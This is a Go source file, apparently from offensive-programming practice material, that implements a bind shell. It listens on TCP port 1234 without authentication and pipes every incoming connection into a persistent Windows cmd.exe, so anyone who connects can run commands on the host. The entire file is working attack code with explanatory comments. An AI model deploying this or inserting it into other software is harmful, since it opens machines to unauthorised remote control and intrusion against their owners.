package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func main() {
	listener, err := net.Listen("tcp", ":1234")
	if err != nil {
		log.Fatalln(err)
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln(err)
		}
		go handleConnection(conn)
	}
}

func handleConnection(connection net.Conn) {
	// create instance of cmd without executing yet
	cmd := exec.Command("cmd", "/k") // /k keeps cmd persistent, keeps running until we are done
	readerPipe, writerPipe := io.Pipe()

	cmd.Stdin = connection  // cmd gets input from connection
	cmd.Stdout = writerPipe // writes to the writer pipe

	go func() {
		_, err := io.Copy(connection, readerPipe) // continuously copies from pipe back to connection/client
		if err != nil {
			log.Fatalln(err)
		}
	}()

	err := cmd.Run()
	if err != nil {
		log.Fatalln(err)
	}

	_ = connection.Close()
}
